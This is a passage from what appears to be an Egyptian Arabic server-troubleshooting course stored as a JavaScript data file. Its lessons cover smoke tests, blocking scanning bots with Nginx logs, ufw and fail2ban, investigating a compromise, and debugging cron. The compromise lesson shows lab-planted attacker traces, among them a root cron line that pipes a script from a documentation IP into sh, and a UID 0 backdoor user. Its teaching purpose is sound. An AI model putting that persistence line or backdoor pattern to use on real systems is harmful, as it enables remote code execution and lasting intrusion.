الكود ده بيخليه يشتغل في CI أو بعد أي deploy: [[./smoke.sh && echo "deploy ok" || ./rollback.sh]]. [[echo $?]] بعده بيطبع 0 لو كله تمام، 1 لو حاجة اتكسرت. جرّب اكسر صفحة عمدًا وشوف الرقم بقى 1، ده اللي بيخلّيه أوتوماتيك. أضمن حاجة تعملها بعد deploy.`,
          solCode: R`#!/usr/bin/env bash
# smoke.sh — run after every deploy
fail=0
for u in / /login /contact /api/health; do
  code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" "https://example.com$u")
  echo "$u $code"
  [ "$code" = "200" ] || fail=1
done
code=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" https://example.com/nope-404)
echo "/nope-404 $code"
[ "$code" = "404" ] || fail=1
exit $fail`
        },
        {
          cmd: "بوت بيضرب الموقع",
          title: "آلاف الطلبات من IP واحد",
          desc: "المعالج عالي والـ access log بيجري. بوت بيدوّر على ثغرات (طلبات على wp-login و .env و phpmyadmin) أو scraper. الحل السريع حظر الـ IP، والدائم rate limiting في Nginx أو Cloudflare قدام الموقع.",
          example: R`sudo tail -5000 /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
sudo tail -5000 /var/log/nginx/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head
sudo grep "198.51.100.7" /var/log/nginx/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -5
sudo ufw insert 1 deny from 198.51.100.7
sudo tail -f /var/log/nginx/access.log | grep -vE "\.(css|js|png|jpg|svg|woff2)"
sudo fail2ban-client status nginx-botsearch`,
          try: "أول أمرين بيقولوك مين وعلى إيه. لو IP واحد عامل ٪٤٠ من الطلبات على مسارات غريبة، احظره. ولو مية IP مختلفين، ده هجوم موزّع ومحتاج Cloudflare.",
          deep: {
            why: "أي سيرفر على النت بيتفحص من بوتات طول الوقت: بتدوّر على WordPress و phpMyAdmin و .env و .git. أغلبها ضوضاء. بس بوت واحد عدواني بيوقّع سيرفر صغير.",
            how: R`الأمر الأول: أكتر IPs في آخر ٥٠٠٠ طلب. لو IP واحد فيه آلاف والباقي عشرات، لقيته. التاني: أكتر المسارات المطلوبة. مسارات زي [[/wp-login.php]] أو [[/.env]] أو [[/phpmyadmin]] = بوت بيفحص ثغرات. التالت: الـ IP ده بيطلب إيه بالظبط.

الإسعاف: [[ufw insert 1 deny from IP]]. الـ [[insert 1]] بيحط القاعدة في الأول عشان تتطبق قبل قواعد السماح.

الأمر الخامس بيتابع الطلبات لايف من غير الملفات الثابتة، فتشوف الهجوم وهو بيحصل.

fail2ban فيه jails جاهزة لـ Nginx: [[nginx-botsearch]] بيحظر أوتوماتيك اللي بيطلب مسارات مش موجودة كتير، و [[nginx-http-auth]] اللي بيغلط في باسورد basic auth. الاتنين لازم تفعّلهم في jail.local (enabled = true).

الحل الدائم: Cloudflare قدام الموقع (مجاني): بيمتص الهجمات الموزعة، وبيقفل البوتات المعروفة، و rate limiting بقواعد. ومع Cloudflare، الفايروول يسمح بعناوين Cloudflare بس على 443، فمحدش يوصل السيرفر مباشرة.

ولو الطلبات من مية IP مختلف بنفس النمط: هجوم موزّع (DDoS)، ومفيش حل على السيرفر نفسه غير Cloudflare.`,
            when: "المعالج عالي والـ access log سريع. طلبات على مسارات غريبة.",
            mistakes: "تحظر IP وتكتشف إنه Googlebot أو Cloudflare. اتأكد بـ [[whois IP]] أو reverse DNS الأول."
          },
          teach: R`## الفكرة: لوج Nginx فيه كل طلب، فعدّ

كل طلب بيوصل Nginx بيتكتب سطر في [[access.log]]. لو بوت بيضربك، هيبان كرقم كبير قدام IP واحد أو مسار غريب. الأوامر بتعدّ، وبعدين بتحظر.

عملت ده في معمل: سيرفر Ubuntu 24.04 بـ systemd جوه Docker عليه Nginx و ufw و fail2ban، وجهاز تاني بعت منه طلبات من ٣ IPs: واحد «زائر عادي» ([[172.20.0.3]])، وواحد «بوت» ([[172.20.0.66]]) بيطلب [[/wp-login.php]] و [[/.env]] وأخواتهم ٤٠ مرة لكل واحد، وواحد هادي ([[172.20.0.77]]).

### شكل سطر في access.log

~~~text سطر من البوت
172.20.0.66 - - [06/Oct/2026:13:23:59 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"
~~~

لو قسمته بالمسافات، الأعمدة اللي تهمنا:

| رقم العمود | القيمة | معناه |
|---|---|---|
| [[$1]] | [[172.20.0.66]] | IP الزائر |
| [[$4]] | [[06/Oct/2026:13:23:59]] (وقبلها قوس مربع) | الوقت |
| [[$6]] | [["GET]] | نوع الطلب |
| [[$7]] | [[/wp-login.php]] | المسار |
| [[$9]] | [[404]] | الـ status اللي رجّعته |
| [[$10]] | [[162]] | حجم الرد |
| آخر حاجة | [[zgrab]] | الـ User-Agent: البرنامج اللي طالب (zgrab أداة مسح مشهورة) |

---

## ١. أكتر IPs

~~~bash
sudo tail -5000 /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
~~~

[[tail -5000]] آخر ٥٠٠٠ طلب، و [[awk '{print $1}']] العمود الأول (IP)، و [[sort | uniq -c]] عدّ كل IP (لازم [[sort]] الأول لأن [[uniq]] بيجمع المتجاورين بس)، و [[sort -rn]] الأكبر الأول.

~~~text الناتج
    200 172.20.0.66
    150 172.20.0.3
     10 172.20.0.77
~~~

IP واحد عامل أكتر من نص الطلبات. مش دليل كفاية لوحده (ممكن يبقى شبكة شركة فيها ناس كتير)، فالخطوة الجاية.

---

## ٢. أكتر المسارات

نفس الأمر بس [[$7]] بدل [[$1]]:

~~~text الناتج
     40 /xmlrpc.php
     40 /wp-login.php
     40 /phpmyadmin/
     40 /.git/config
     40 /.env
     40 /
     30 /login
...
~~~

موقعي مش WordPress ومفيهوش phpMyAdmin. الطلبات دي مسح ثغرات: بيدوّر على [[.env]] (فيه أسرار)، و [[.git/config]] (الكود)، و لوحات إدارة. المهم إنها كلها رجعت [[404]] (أو [[403]]). لو [[/.env]] رجع [[200]]، دي كارثة مش بوت.

---

## ٣. البوت ده بيطلب إيه بالظبط

~~~bash
sudo grep "172.20.0.66" /var/log/nginx/access.log | awk '{print $7}' | sort | uniq -c | sort -rn | head -5
~~~

[[grep]] خلي سطور الـ IP ده بس، وبعدين نفس العدّ على المسارات:

~~~text الناتج
     40 /xmlrpc.php
     40 /wp-login.php
     40 /phpmyadmin/
     40 /.git/config
     40 /.env
~~~

كل طلباته مسارات ثغرات، ولا صفحة حقيقية. ده بوت أكيد.

---

## ٤. [[sudo ufw insert 1 deny from IP]]

- [[deny from IP]] ارفض أي حاجة جاية من الـ IP ده.
- [[insert 1]] حط القاعدة في **أول** القايمة. ufw بيقرا القواعد بالترتيب وبيقف عند أول واحدة تنطبق، فلو القاعدة في الآخر، قاعدة [[allow 80]] اللي قبلها هتسمح له الأول.

~~~text ufw status numbered بعدها
     To                         Action      From
     --                         ------      ----
[ 1] Anywhere                   DENY IN     172.20.0.66
[ 2] 22/tcp                     ALLOW IN    Anywhere
~~~

~~~text من البوت
curl: (28) Connection timed out after 5002 milliseconds
~~~

~~~text من الزائر العادي
200
~~~

> قبل ما تحظر، اتأكد إنه مش Googlebot أو Cloudflare: [[host IP]] أو [[whois IP]]. حظر Googlebot = الموقع يختفي من جوجل.

---

## ٥. المتابعة لايف

~~~bash
sudo tail -f /var/log/nginx/access.log | grep -vE "\.(css|js|png|jpg|svg|woff2)"
~~~

- [[tail -f]] (follow) اطبع أي سطر جديد بيتكتب، ومتخرجش (Ctrl+C يوقفه).
- [[grep -v]] (invert) اطبع السطور اللي **مش** مطابقة.
- [[\.(css|js|...)]] [[\.]] نقطة حقيقية، وبعدها أي امتداد من دول. يعني «شيل طلبات الملفات الثابتة».

طلبت ٦ صفحات منهم ٣ ملفات ثابتة، وظهر:

~~~text الناتج
172.20.0.3 - - [06/Oct/2026:13:24:42 +0000] "GET / HTTP/1.1" 200 25 "-" "curl/8.5.0"
172.20.0.3 - - [06/Oct/2026:13:24:42 +0000] "GET /contact HTTP/1.1" 200 32 "-" "curl/8.5.0"
172.20.0.3 - - [06/Oct/2026:13:24:42 +0000] "GET /login HTTP/1.1" 200 30 "-" "curl/8.5.0"
~~~

الصفحات بس، من غير الـ css والـ js والصور. كده تشوف الهجوم وهو بيحصل من غير زحمة.

---

## ٦. [[sudo fail2ban-client status nginx-botsearch]]

fail2ban بيقرا اللوجات ويحظر أوتوماتيك اللي بيعمل حاجة مريبة كتير. [[nginx-botsearch]] اسم «jail» جاهز بيدوّر على طلبات لمسارات مش موجودة.

بعد ما سطّبته على طول:

~~~text الناتج
Sorry but the jail 'nginx-botsearch' does not exist
~~~

الـ jail موجود كإعداد بس مش مفعّل. فعّلته في ملف [[/etc/fail2ban/jail.d/lab.local]]:

~~~text lab.local
[nginx-botsearch]
enabled = true
port = http,https
logpath = /var/log/nginx/access.log
maxretry = 5
findtime = 10m
bantime = 1h
~~~

يعني: ٥ محاولات في ١٠ دقايق = حظر ساعة. (في إعداد أوبونتو الافتراضي، الـ jail ده بيقرا [[error.log]]؛ أنا وجّهته لـ [[access.log]] في المعمل.) وبعد [[systemctl restart fail2ban]]:

~~~text الناتج
Status for the jail: nginx-botsearch
|- Filter
|  |- Currently failed:	0
|  |- Total failed:	80
|  $__bt- File list:	/var/log/nginx/access.log
$__bt- Actions
   |- Currently banned:	1
   |- Total banned:	1
   $__bt- Banned IP list:	172.20.0.66
~~~

لقى ٨٠ طلب مريب وحظر البوت لوحده. [[fail2ban-client set nginx-botsearch unbanip IP]] لو حظر حد بالغلط.

---

## الجدول

| الأمر | بيجاوب |
|---|---|
| عدّ [[$1]] | مين بيطلب أكتر |
| عدّ [[$7]] | على إيه |
| [[grep IP]] ثم عدّ [[$7]] | الـ IP ده بيعمل إيه |
| [[ufw insert 1 deny from]] | حظر فوري |
| [[tail -f]] مع [[grep -v]] | الهجوم لايف |
| [[fail2ban-client status]] | الحظر الأوتوماتيك شغال؟ |

## الخلاصة

- [[awk]] و [[sort]] و [[uniq -c]] بيحوّلوا آلاف السطور لجدول صغير.
- IP كتير + مسارات ثغرات = بوت. مية IP بنفس النمط = هجوم موزّع ومحتاج Cloudflare.
- [[insert 1]] عشان قاعدة الحظر تسبق قواعد السماح.`,
          lines: [
            "أكتر IPs في آخر ٥٠٠٠ طلب.",
            "أكتر المسارات المطلوبة (wp-login و .env = بوت).",
            "الـ IP المشبوه بيطلب إيه بالظبط.",
            "احظره، والقاعدة في الأول عشان تتطبق قبل السماح.",
            "تابع الطلبات لايف من غير الملفات الثابتة.",
            "fail2ban بيحظر بوتات Nginx؟"
          ],
          sol: R`أول أمرين بيجاوبوا «مين وعلى إيه»: [[awk '{print $1}' | uniq -c | sort -rn]] بيرتّب الـ IPs بعدد الطلبات، و[[$7]] بيرتّب المسارات. لو IP واحد عامل ٤٠٪ من الطلبات على مسارات غريبة (زي [[/wp-login.php]] أو [[/.env]] أو [[/admin]])، ده بوت واضح، احظره بـ [[ufw insert 1 deny from IP]].

الأمر التالت بيركّز على IP واحد ويوريك بيعمل إيه بالظبط قبل ما تحكم عليه. [[tail -f access.log | grep -vE "\.(css|js|png...)"]] بيوريك الطلبات الحقيقية لايف من غير ضوضاء الملفات الساكنة، مفيد وانت بتراقب هجوم شغّال.

الفرق المهم: لو مية IP مختلفين كل واحد عامل شوية طلبات، ده هجوم موزّع (DDoS) وحظر IP واحد مش هينفع، محتاج Cloudflare أو [[fail2ban]] بقواعد ذكية. [[fail2ban-client status nginx-botsearch]] بيوريك اللي fail2ban حظرهم تلقائيًا. الفكرة: افهم لو الهجوم من مصدر واحد (احظره) ولا موزّع (محتاج طبقة حماية قبل السيرفر).`
        },
        {
          cmd: "شك في اختراق",
          title: "حاجة بتشتغل مش انت اللي شغّلتها",
          desc: "علامات: عملية غريبة بتاكل المعالج (تعدين)، أو اتصالات خارجة لعناوين مش معروفة، أو ملفات جديدة في المشروع، أو cron مش بتاعك، أو يوزر جديد. الترتيب: اجمع الأدلة قبل ما تعمل أي حاجة، وبعدين اعزل، وبعدين ابني من جديد. متحاولش «تنضّف» سيرفر متخترق.",
          example: R`ps aux --sort=-%cpu | head
sudo ss -tnp state established | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -rn | head
sudo find / -xdev -newer /var/log/lastlog -type f 2>/dev/null | grep -vE "^/(proc|sys|var/log|tmp)" | head -30
sudo cat /etc/passwd | awk -F: '$3 == 0 || $3 >= 1000'
sudo crontab -l; sudo ls -la /etc/cron.d /var/spool/cron/crontabs
last -20 && sudo grep "Accepted" /var/log/auth.log | tail`,
          try: "خد snapshot للسيرفر من لوحة الاستضافة قبل أي تعديل (ده الدليل). غيّر كل المفاتيح والباسوردات من جهاز نضيف. وابني سيرفر جديد من الصفر بالسكربتات، وانقل الداتا بعد ما تفحصها.",
          deep: {
            why: "أصعب حالة نفسيًا وتقنيًا. الغريزة إنك «تنضّف». الصح إنك تفترض إن كل حاجة على السيرفر مش موثوقة، تجمع الأدلة، وتبني من جديد.",
            how: R`الأدلة أولًا، قبل أي ريستارت أو مسح: snapshot من لوحة الاستضافة للسيرفر كله.

[[ps --sort=-%cpu]]: عملية بتاكل المعالج باسم عشوائي أو من يوزر غريب = تعدين غالبًا. [[ss -tnp established]]: اتصالات خارجة لعناوين مش بتاعتك (C&C أو تعدين). [[find -newer]]: ملفات اتعدلت من آخر login، في المشروع أو في /usr/bin. [[/etc/passwd]] بـ UID فوق 1000: يوزرز اتعملوا، و UID 0 لغير root: باب خلفي. [[crontab]] و [[/etc/cron.d]]: مهام مش بتاعتك بتضمن رجوع المهاجم. [[last]] و [[auth.log]]: مين دخل إمتى ومنين.

بعد الأدلة: اعزل (ufw deny incoming ما عدا IP بتاعك، أو وقّف السيرفر من اللوحة).

وبعدين من جهاز نضيف: غيّر كل حاجة: باسورد القاعدة، ومفاتيح API (Paymob، Supabase)، و JWT secret، ومفاتيح SSH. أي سر كان على السيرفر اعتبره مسروق.

وابني سيرفر جديد من الصفر بسكربتات التجهيز (عشان كده السكربتات مهمة)، وانقل الداتا بعد فحصها (dump وافحص الجداول الغريبة). السيرفر القديم يتمسح بعد ما تخلص التحليل.

وبعدها: إزاي دخل؟ ثغرة في مكتبة (npm audit)، أو باسورد ضعيف، أو بورت مفتوح، أو سر في GitHub. من غير ما تعرف، هيدخل تاني.`,
            when: "أي علامة من اللي فوق. وفحص شهري وقائي بنفس الأوامر.",
            mistakes: "تمسح العملية الغريبة وتكمّل شغل. المهاجم ساب باب تاني. و«الحماية» بتغيير باسورد واحد."
          },
          teach: R`## الفكرة: الأوامر دي «تصوير» مش «تنضيف»

الأوامر الست كلها بتقرا بس، مبتغيّرش حاجة. هدفها تجمع أدلة: إيه اللي شغال، بيكلّم مين، إيه اللي اتغيّر، مين اتضاف، وإيه اللي هيرجّع المهاجم. بعدها القرار بيبقى دايمًا: سيرفر جديد.

عشان أوريك الشكل الحقيقي من غير سيرفر مخترق فعلًا، «زرعت» آثار شبيهة باللي بيسيبه المهاجمين في معمل معزول: سيرفر Ubuntu 24.04 بـ systemd جوه Docker، فيه عملية بتاكل المعالج باسم مزيّف، واتصال خارج لجهاز تاني على البورت 3333 (بورت مشهور لمجمّعات التعدين)، ويوزر بـ UID 0، وملف cron، وملفات جديدة. (الـ IP [[198.51.100.23]] تحت عنوان وهمي من النوع المخصص للأمثلة.)

---

## ١. [[ps aux --sort=-%cpu | head]]

~~~text الناتج
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root        6926 99.5  0.0   2804  1664 ?        R    13:25   0:02 kworkerds -c while :; do :; done
root        2262  1.8  0.5 2944392 94056 ?       Ssl  13:04   0:23 /usr/bin/dockerd -H fd:// ...
~~~

اسم [[kworkerds]] معمول عشان يتلخبط مع [[kworker]] بتاع الكيرنل. الفرق: عمليات الكيرنل الحقيقية بتظهر بين قوسين مربعين زي [[[kworker/0:1]]] ومبتاكلش ٩٩٪ معالج باستمرار. والاسم ممكن يتزوّر، بس الملف الحقيقي لأ:

~~~bash
ls -l /proc/6926/exe
~~~

~~~text الناتج
lrwxrwxrwx 1 root root 0 Oct  6 13:26 /proc/6926/exe -> /usr/bin/dash
~~~

[[/proc/PID/exe]] بيشاور على البرنامج اللي فعلًا شغال. «kworkerds» طلع shell. وفي حالة حقيقية غالبًا هيشاور على حاجة في [[/tmp]] أو [[/var/tmp]] أو [[(deleted)]] (المهاجم مسح الملف بعد ما شغّله).

---

## ٢. الاتصالات الخارجة

~~~bash
sudo ss -tnp state established | awk '{print $4}' | cut -d: -f1 | sort | uniq -c | sort -rn | head
~~~

| الحتة | بتعمل إيه |
|---|---|
| [[ss -tnp state established]] | اتصالات TCP المفتوحة دلوقتي، بأرقام، ومين صاحبها |
| [[awk '{print $4}']] | العمود الرابع: الطرف التاني ([[Peer Address:Port]]). مع [[state]] عمود الحالة بيختفي، فالـ peer بيبقى الرابع |
| [[cut -d: -f1]] | قسّم عند [[:]] وخد الجزء الأول = IP من غير البورت |
| [[sort ... uniq -c ... sort -rn]] | عدّ كل IP، والأكتر الأول |

~~~text ss -tnp state established لوحده
Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
0      0         172.20.0.2:60822   172.20.0.3:3333 users:(("sleep",pid=6928,fd=3))
~~~

~~~text بعد العدّ
      1 Address
      1 172.20.0.3
~~~

([[Address]] ده جزء من سطر العناوين اتعدّ، تجاهله.) اتصال خارج لبورت 3333، والبرنامج اسمه [[sleep]]! برنامج عادي ملوش أي سبب يفتح اتصال. على سيرفر حقيقي، أي IP مش بتاع قاعدتك أو خدمة معروفة يتسأل عنه.

---

## ٣. الملفات اللي اتعدّلت

~~~bash
sudo find / -xdev -newer /var/log/lastlog -type f 2>/dev/null | grep -vE "^/(proc|sys|var/log|tmp)" | head -30
~~~

- [[-newer /var/log/lastlog]] الملفات اللي اتعدّلت **بعد** الملف ده. [[lastlog]] بيتحدّث مع كل login، فده تقريبًا «من آخر مرة حد دخل».
- [[-xdev]] متخرجش للديسكات التانية، و [[-type f]] ملفات بس.
- [[grep -vE "^/(proc|sys|var/log|tmp)"]] شيل الأماكن اللي بتتغير لوحدها طول الوقت. ([[^]] يعني بداية السطر.)

~~~text الناتج
/etc/passwd-
/etc/passwd
/etc/shadow
/etc/group
/etc/gshadow
...
/etc/cron.d/dbus-update
/var/tmp/.cache/kdevtmpfsi
/usr/local/bin/ls-helper
~~~

كل سطر هنا سؤال: [[/etc/passwd]] و [[/etc/shadow]] اتغيروا = يوزر اتضاف أو اتعدّل. ملف في [[/etc/cron.d]] انت مش فاكره. برنامج في فولدر مخفي ([[.cache]] بنقطة) جوه [[/var/tmp]]. وأداة في [[/usr/local/bin]] انت مسطبتهاش.

---

## ٤. [[sudo cat /etc/passwd | awk -F: '$3 == 0 || $3 >= 1000']]

[[/etc/passwd]] فيه سطر لكل يوزر، والخانات مفصولة بـ [[:]] (عشان كده [[-F:]]). الخانة التالتة [[$3]] هي الـ UID (رقم اليوزر). [[0]] = root، و [[1000]] وأكتر = يوزرز بشر عاديين، والباقي حسابات نظام.

~~~text الناتج
root:x:0:0:root:/root:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
deploy:x:1001:1001::/home/deploy:/bin/bash
sysupd:x:0:0::/root:/bin/bash
backup2:x:1002:1002::/home/backup2:/bin/bash
~~~

[[sysupd]] بـ UID [[0]] يعني root تاني باسم مختلف: باب خلفي صريح، لأن لينكس بيعامل أي UID 0 كـ root. و [[backup2]] يوزر انت معملتوش. ([[nobody]] و [[ubuntu]] طبيعيين في أوبونتو.)

---

## ٥. [[sudo crontab -l; sudo ls -la /etc/cron.d /var/spool/cron/crontabs]]

~~~text الناتج
no crontab for root
/etc/cron.d:
total 28
drwxr-xr-x 1 root root 4096 Oct  6 13:25 .
drwxr-xr-x 1 root root 4096 Oct  6 13:25 ..
-rw-r--r-- 1 root root  102 Mar 31  2024 .placeholder
-rw-r--r-- 1 root root  802 Apr 16  2023 certbot
-rw-r--r-- 1 root root   59 Oct  6 13:25 dbus-update
-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all

/var/spool/cron/crontabs:
total 12
drwx-wx--T 1 root crontab 4096 Oct  6 13:07 .
drwxr-xr-x 1 root root    4096 Oct  6 12:42 ..
~~~

قارن التواريخ: [[certbot]] و [[e2scrub_all]] من وقت تسطيب الحزم، و [[dbus-update]] اتعمل النهارده. جواه:

~~~text cat /etc/cron.d/dbus-update
*/5 * * * * root curl -fsSL http://198.51.100.23/x.sh | sh
~~~

كل ٥ دقايق، كـ root، نزّل سكربت من بره ونفّذه. ده «الـ persistence»: لو قتلت العملية، الـ cron هيرجّعها بعد ٥ دقايق. و [[/var/spool/cron/crontabs]] فيه crontab كل يوزر (هنا فاضي).

---

## ٦. [[last -20 && sudo grep "Accepted" /var/log/auth.log | tail]]

[[last]] بيقرا سجل الدخول ([[/var/log/wtmp]]):

~~~text الناتج
reboot   system boot  6.6.87.2-microso Tue Oct  6 12:42   still running

wtmp begins Tue Oct  6 12:42:47 2026
~~~

هنا مفيش غير الإقلاع، لأن الدخول في المعمل كان بأوامر من غير ترمنال. على سيرفر حقيقي هتلاقي سطر لكل دخول بالـ IP والمدة. و [[auth.log]] بيسجّل كل دخول SSH ناجح:

~~~text الناتج
2026-10-06T13:09:26... srv sshd[3179]: Accepted publickey for deploy from 172.20.0.3 port 57414 ssh2: ED25519 SHA256:ErOoF948d3gx...
~~~

| الحتة | السؤال |
|---|---|
| [[Accepted publickey]] أو [[Accepted password]] | دخل بمفتاح ولا باسورد؟ (باسورد على سيرفر المفروض مقفول فيه = مشكلة) |
| [[for deploy]] | بأنهي يوزر |
| [[from 172.20.0.3]] | من أنهي IP. تعرفه؟ |
| [[SHA256:...]] | بصمة المفتاح: أنهي مفتاح بالظبط. قارنها بـ [[ssh-keygen -lf ~/.ssh/id_ed25519.pub]] على جهازك |

> المهاجم الشاطر بيمسح السطور دي. لو [[auth.log]] فيه فجوة غريبة أو [[last]] فاضي على سيرفر بتدخله كل يوم، ده دليل في حد ذاته.

---

## الجدول

| الأمر | بيدوّر على |
|---|---|
| [[ps --sort=-%cpu]] و [[/proc/PID/exe]] | تعدين أو عملية باسم مزيّف |
| [[ss state established]] | اتصال خارج لمكان غريب |
| [[find -newer]] | ملفات اتزرعت أو اتعدّلت |
| [[/etc/passwd]] بـ awk | UID 0 زيادة، أو يوزرز جديدة |
| [[cron.d]] و [[crontabs]] | الباب اللي بيرجّع المهاجم |
| [[last]] و [[auth.log]] | مين دخل، امتى، ومنين |

## الخلاصة

- اجمع الأدلة (و snapshot من لوحة الاستضافة) قبل أي تعديل.
- الأسامي بتتزوّر، [[/proc/PID/exe]] لأ.
- لقيت حاجة؟ متنضّفش. غيّر كل الأسرار من جهاز نضيف، وابني سيرفر جديد.`,
          lines: [
            "عملية غريبة بتاكل المعالج (تعدين؟).",
            "اتصالات خارجة لعناوين مش بتاعتك.",
            "ملفات اتعدلت من آخر login، بره الأماكن الطبيعية.",
            "يوزرز اتعملوا (UID 1000 وأكتر)، وأي يوزر غير root بـ UID 0 = باب خلفي.",
            "مهام cron مش بتاعتك (باب رجوع).",
            "مين دخل إمتى ومنين."
          ],
          sol: R`أهم قرار قبل أي أمر: خد snapshot للسيرفر من لوحة الاستضافة. ده دليلك، وأي [[rm]] أو restart ممكن يمسح آثار المخترق. الأوامر دي للفهم مش للتنضيف.

[[ps aux --sort=-%cpu]] بيكشف miner أو process غريب آكل المعالج. [[ss -tnp state established]] بيوريك الاتصالات الخارجة (miner بيتصل بـ pool، backdoor بيتصل بسيرفر المخترق). [[find / -newer /var/log/lastlog]] بيوريك الملفات المتعدّلة مؤخرًا (ملفات مزروعة). [[awk -F: '$3==0']] على [[/etc/passwd]] بيكشف أي مستخدم تاني بصلاحية root (UID 0) غيرك. [[crontab]] و[[/etc/cron.d]] بيكشفوا persistence (كود بيعيد تشغيل نفسه). [[last]] و[[auth.log]] بيوريّوك مين دخل وامتى.

القاعدة الأهم بعد التأكد: متنضّفش السيرفر المخترق وتكمّل عليه، لأنك مش هتعرف تتأكد إنك شلت كل حاجة. الصح: غيّر كل المفاتيح والباسوردات من جهاز نضيف، ابني سيرفر جديد من الصفر بسكربتاتك، وانقل الداتا بعد فحصها. راجع «تاب الأمان» و«تاب VPS». flag danger.`
        },
        {
          cmd: "cron مشتغلش",
          title: "الباك أب مبقاش يتعمل من أسبوع",
          desc: "المهمة في crontab بس مفيش نتيجة. الأسباب المعتادة: الأمر شغال من الترمنال بس مش من cron (PATH مختلف)، أو الناتج مش متوجّه لملف فمش شايف الـ error، أو صلاحيات، أو % في الأمر، أو السكربت نفسه بيفشل بصمت.",
          example: R`grep CRON /var/log/syslog | tail -20
crontab -l
sudo tail -20 /var/log/backup.log
env -i HOME=/home/deploy LOGNAME=deploy PATH=/usr/bin:/bin SHELL=/bin/sh /bin/sh -c '/home/deploy/backup.sh'
which pg_dump docker
systemctl status cron`,
          try: "الأمر الرابع بيشغّل السكربت ببيئة فاضية زي cron بالظبط. لو فشل هنا ونجح من الترمنال، المشكلة PATH: اكتب المسارات الكاملة في السكربت.",
          deep: {
            why: "المهمة اللي بتشتغل «لوحدها» أخطر حاجة، لأن لما تقف محدش بيلاحظ. الباك أب اللي وقف من شهر بتكتشفه يوم ما تحتاجه.",
            how: R`[[grep CRON /var/log/syslog]]: cron بيسجّل كل مهمة شغّلها بالوقت والأمر. لو المهمة مش موجودة هنا، cron مشغّلهاش أصلًا: الصيغة غلط، أو crontab اتحفظ بيوزر تاني، أو cron واقف ([[systemctl status cron]]). لو موجودة، اتشغّلت وفشلت.

[[crontab -l]]: الصيغة. غلطات شائعة: [[%]] من غير escape (cron بيعتبرها سطر جديد)، ومسار نسبي، وسطر جديد ناقص في آخر الملف.

[[tail backup.log]]: لو المهمة بتوجّه ناتجها للوج (وهي المفروض)، الـ error هنا. لو مفيش لوج، ضيف [[>> /var/log/backup.log 2>&1]] في آخر السطر، وده أول إصلاح.

الأمر الرابع الأهم: [[env -i ... PATH=/usr/bin:/bin /bin/sh -c]] بيشغّل السكربت بنفس بيئة cron بالظبط (PATH قصير و sh مش bash): مفيش PATH بتاعك، ولا nvm، ولا aliases. لو فشل هنا ونجح من الترمنال، السبب PATH. [[which pg_dump docker]] بيديك المسارات الكاملة تكتبها في السكربت أو تحط [[PATH=...]] أول سطر في crontab.

والوقاية: المهمة تبعتلك رسالة لو فشلت، أو healthchecks.io: المهمة بتطلب URL لما تنجح، ولو مطلبتش في الوقت المتوقع بيبعتلك تنبيه.`,
            when: "أي مهمة مجدولة مبتشتغلش. وبعد ما تضيف مهمة: تأكد من syslog إنها اشتغلت أول مرة.",
            mistakes: "تختبر السكربت من الترمنال بس. وتفترض إن الباك أب شغال لأنك ضفته في cron."
          },
          teach: R`## الفكرة: السكربت شغال من الترمنال، ومن cron لأ

cron بيشغّل المهام في بيئة فقيرة: PATH قصير، و [[sh]] مش [[bash]]، ومن غير أي حاجة من [[.bashrc]] أو [[.profile]]. فأمر انت متعوّد عليه في الترمنال ممكن ميبقاش موجود من وجهة نظر cron. الأوامر بتسأل: cron شغّل المهمة؟ ولو شغّلها، فشلت ليه؟

عملت ده في معمل: سيرفر Ubuntu 24.04 بـ systemd و cron و rsyslog جوه Docker، ويوزر [[deploy]] عنده سكربت [[backup.sh]] بينادي أداة اسمها [[db-backup]] متسطبة في [[~/.local/bin]] (مكان موجود في PATH بتاع الترمنال بس). من الترمنال:

~~~text الناتج
dumped app db -> /home/deploy/backups/app.sql.gz
backup ok Tue Oct  6 13:27:51 UTC 2026
~~~

شغال. وحطيته في cron كل دقيقة، ومعاه سطر تاني فيه [[%]].

---

## ١. [[grep CRON /var/log/syslog | tail -20]]

cron بيسجّل كل مهمة شغّلها في [[syslog]]:

~~~text الناتج
2026-10-06T13:28:01.846838+00:00 srv CRON[7030]: (deploy) CMD (echo "run $(date +)
2026-10-06T13:28:01.847054+00:00 srv CRON[7029]: (deploy) CMD (/home/deploy/backup.sh >> /var/log/backup.log 2>&1)
2026-10-06T13:28:01.847612+00:00 srv CRON[7027]: (CRON) info (No MTA installed, discarding output)
~~~

| الحتة | معناها |
|---|---|
| [[CRON[7029]]] | عملية cron رقم 7029 هي اللي شغّلت المهمة |
| [[(deploy)]] | اتشغّلت بيوزر deploy |
| [[CMD (...)]] | الأمر بالظبط |
| [[No MTA installed, discarding output]] | مهمة طبعت حاجة، و cron كان عايز يبعتهالك إيميل، ومفيش برنامج إيميل (MTA)، فرماها |

سطر [[backup.sh]] موجود = cron **شغّلها**. فالمشكلة جوه السكربت مش في cron. لو السطر مش موجود خالص، يبقى الصيغة غلط أو الـ crontab مش متحفظ أو cron واقف.

### فخ الـ %

السطر الأول في الـ crontab كان:

~~~text crontab
* * * * * echo "run $(date +%F)" >> /tmp/pct.log
~~~

و cron سجّله [[echo "run $(date +)]]، مقطوع عند [[%]]. في الـ crontab، [[%]] معناها «سطر جديد»، وكل اللي بعدها بيتبعت كـ input للأمر. فالأمر بقى ناقص ومكسور، و [[/tmp/pct.log]] عمره ما اتعمل:

~~~text cat /tmp/pct.log
cat: /tmp/pct.log: No such file or directory
~~~

الحل: [[\%]] بدل [[%]] جوه الـ crontab، أو حط الأمر في سكربت.

---

## ٢. [[crontab -l]]

بيعرض مهام اليوزر الحالي ([[crontab -u deploy -l]] لو انت root وعايز يوزر تاني):

~~~text الناتج
* * * * * /home/deploy/backup.sh >> /var/log/backup.log 2>&1
* * * * * echo "run $(date +%F)" >> /tmp/pct.log
~~~

